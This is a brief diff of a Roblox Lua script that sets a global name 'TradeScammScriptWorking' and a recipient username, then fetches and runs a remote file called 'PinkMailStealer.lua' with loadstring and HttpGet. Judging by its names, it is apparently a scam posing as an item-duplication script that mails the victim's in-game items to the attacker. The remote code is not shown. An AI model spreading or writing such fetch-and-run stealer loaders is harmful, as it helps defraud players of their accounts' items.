@@ -2,4 +2,4 @@ _G.Name = "TradeScammScriptWorking"
 
 _G.Username = "Muhammed168T"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkMailStealer.lua", true))()```
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkMailStealer.lua", true))()
